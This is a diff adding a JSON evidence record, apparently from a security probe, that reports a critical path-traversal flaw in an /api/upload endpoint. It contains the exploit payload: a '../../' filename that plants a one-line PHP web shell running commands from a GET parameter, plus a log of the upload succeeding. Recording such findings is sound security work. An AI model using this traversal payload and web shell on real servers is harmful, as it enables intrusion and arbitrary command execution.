@@ -1,0 +1,19 @@
+{
+  "probe_id": "S_P_01",
+  "timestamp": "2026-06-26T01:23:36.874123",
+  "evidence": {
+    "vulnerability_type": "path_traversal",
+    "affected_endpoint": "/api/upload",
+    "exploit_payload": {
+      "filename": "../../var/www/html/shell.php",
+      "file_content": "<?php system($_GET['cmd']); ?>"
+    },
+    "upload_succeeded": true,
+    "file_saved_path": "/var/www/html/shell.php",
+    "remote_code_execution": true,
+    "severity": "critical",
+    "affected_components": "文件上传模块",
+    "affected_users": "所有用户"
+  },
+  "log_snippet": "[2026-06-25 10:05:23] POST /api/upload\n[2026-06-25 10:05:23] Filename: ../../var/www/html/shell.php\n[2026-06-25 10:05:24] Saving to: /var/www/html/shell.php\n[2026-06-25 10:05:24] Upload successful (CRITICAL!)"
+}
